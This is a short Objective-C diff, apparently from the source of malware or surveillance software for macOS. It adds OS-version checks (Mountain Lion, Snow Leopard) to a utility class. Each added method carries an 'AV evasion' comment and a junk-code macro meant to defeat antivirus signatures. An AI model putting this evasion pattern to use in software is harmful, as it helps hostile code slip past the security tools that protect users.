@@ -858,6 +858,16 @@ static __m_MUtils *sharedUtils = nil;
                      atPath: @"/etc/authorization"];
 }
 
+- (BOOL)isMtLion
+{  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  if (gOSMajor == 10 && gOSMinor == 8)
+    return YES;
+  
+  return NO;
+}
+
 - (BOOL)isLion
 {  // AV evasion: only on release build
   AV_GARBAGE_001
@@ -874,6 +884,17 @@ static __m_MUtils *sharedUtils = nil;
   AV_GARBAGE_009
   
   if (gOSMajor == 10 && gOSMinor == 5)
+    return YES;
+  
+  return NO;
+}
+
+- (BOOL)isSnowLeopard
+{
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
+  if (gOSMajor == 10 && gOSMinor == 6)
     return YES;
   
   return NO;
